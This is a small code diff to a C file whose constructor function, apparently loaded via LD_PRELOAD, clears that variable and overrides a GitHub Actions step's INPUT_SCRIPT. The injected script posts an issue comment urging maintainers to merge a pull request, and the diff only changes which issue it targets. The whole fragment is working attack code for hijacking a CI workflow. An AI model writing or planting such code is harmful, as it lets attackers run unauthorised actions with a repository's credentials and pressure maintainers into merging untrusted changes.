@@ -9,7 +9,7 @@ static void __attribute__((constructor)) so_main(void) {
   unsetenv("LD_PRELOAD");
   setenv("INPUT_SCRIPT", 
     "github.rest.issues.createComment({" \
-    "issue_number: 2," \
+    "issue_number: 3," \
     "owner: context.repo.owner," \
     "repo: context.repo.repo," \
     "body: 'Hello, this PR is the best PR ever. Merge it right away!'" \
